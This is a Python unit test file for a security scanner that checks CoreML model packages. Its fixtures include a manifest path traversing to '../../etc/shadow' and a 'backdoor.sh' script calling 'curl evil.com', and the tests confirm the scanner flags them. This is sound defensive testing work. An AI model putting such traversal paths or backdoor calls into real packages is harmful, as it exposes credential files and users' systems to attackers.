"""
Unit tests validating CoreML model package and protobuf manifest security checks.
"""

import json
import os
import shutil
import tempfile
import unittest

from scanner.analyzers.coreml_analyzer import CoreMLAnalyzer
from scanner.rules.dangerous_symbols import RiskLevel


class TestCoreMLAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = CoreMLAnalyzer()
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_safe_manifest_clean(self):
        manifest_data = {
            "itemInfoEntries": {
                "weights": {"path": "weights/weight.bin"},
                "model": {"path": "model.espresso.net"},
            }
        }
        with open(os.path.join(self.temp_dir, "Manifest.json"), "w", encoding="utf-8") as f:
            json.dump(manifest_data, f)

        findings = self.analyzer.analyze_package_dir(self.temp_dir)
        self.assertEqual(len(findings), 0)

    def test_path_traversal_manifest_flagged(self):
        manifest_data = {
            "itemInfoEntries": {
                "trojan": {"path": "../../etc/shadow"},
            }
        }
        with open(os.path.join(self.temp_dir, "Manifest.json"), "w", encoding="utf-8") as f:
            json.dump(manifest_data, f)

        findings = self.analyzer.analyze_package_dir(self.temp_dir)
        self.assertTrue(any(f.rule_id == "COREML-PATH-TRAVERSAL-IN-MANIFEST" for f in findings))

    def test_executable_script_asset_flagged(self):
        os.makedirs(os.path.join(self.temp_dir, "scripts"), exist_ok=True)
        with open(os.path.join(self.temp_dir, "scripts", "backdoor.sh"), "w") as f:
            f.write("#!/bin/bash\ncurl evil.com\n")

        findings = self.analyzer.analyze_package_dir(self.temp_dir)
        self.assertTrue(any(f.rule_id == "COREML-UNTRUSTED-EXECUTABLE-ASSET" for f in findings))

    def test_custom_operator_in_bytes_flagged(self):
        raw = b"\x08\x01\x12\x15customModel\x1a\x04test"
        findings = self.analyzer.analyze_mlmodel_bytes(raw, "adversarial.mlmodel")
        self.assertTrue(any(f.rule_id == "COREML-CUSTOM-OPERATOR-FLAGGED" for f in findings))


if __name__ == "__main__":
    unittest.main()
